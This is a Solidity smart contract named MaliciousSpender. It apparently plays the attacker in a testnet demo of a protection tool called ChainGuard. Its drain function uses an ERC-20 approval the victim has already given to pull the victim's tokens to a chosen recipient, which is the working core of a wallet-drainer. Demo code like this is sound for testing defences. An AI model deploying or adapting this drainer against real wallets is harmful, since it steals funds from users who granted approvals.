// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

interface IERC20Drain {
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/// @title MaliciousSpender
/// @notice DEMO / TESTNET ONLY. Plays the attacker in the ChainGuard demo: once a victim has approved it,
/// anyone can call `drain` to pull the approved tokens to `recipient`. Never reverts, so the outcome is
/// always a visible event: `Drained` (protection off or too slow) or `DrainFailed` (allowance already 0).
contract MaliciousSpender {
    event Drained(
        address indexed token, address indexed victim, address indexed recipient, uint256 amount
    );
    event DrainFailed(address indexed token, address indexed victim, uint256 allowance);

    function drain(address token, address victim, address recipient) external returns (bool) {
        uint256 allowed = IERC20Drain(token).allowance(victim, address(this));
        uint256 bal = IERC20Drain(token).balanceOf(victim);
        uint256 amount = bal < allowed ? bal : allowed;
        if (amount > 0) {
            try IERC20Drain(token).transferFrom(victim, recipient, amount) returns (bool ok) {
                if (ok) {
                    emit Drained(token, victim, recipient, amount);
                    return true;
                }
            } catch {}
        }
        emit DrainFailed(token, victim, allowed);
        return false;
    }
}
